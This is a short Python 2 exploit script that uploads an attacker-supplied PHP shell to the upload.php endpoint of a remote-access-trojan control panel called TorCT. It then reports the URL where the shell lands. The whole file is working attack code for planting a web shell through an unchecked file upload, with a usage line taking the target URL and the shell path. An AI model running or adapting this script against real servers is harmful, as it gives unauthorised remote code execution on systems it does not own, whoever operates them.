#!/usr/bin/python2
# coding: utf-8
# TorCT RAT C&C Panel Shell Upload Exploit
# Written before coffee happened.
# Author: Darren Martyn
# Licence: WTFPL - wtfpl.net
import requests
import sys
import os

def upload_shell(url, shell):
    try:
        files = {'file': open(shell, "rb")}
        r = requests.post(url=url, files=files)
    except:
        sys.exit("[-] failure")
    if "File is successfully stored!" in r.text: # the next line is ugly as sin.
        print "[+] Shell Uploaded! It should be in: %s" %(url.replace("upload.php", "Upload/%s" %(os.path.basename(shell))))
    else:
        sys.exit("[-] whatever.")

def main(args):
    if len(args) != 3:
        sys.exit("use: %s http://torct.whatever/upload.php /your/shell.php" %(args[0]))
    upload_shell(url=args[1], shell=args[2])

if __name__ == "__main__":
    main(args=sys.argv)
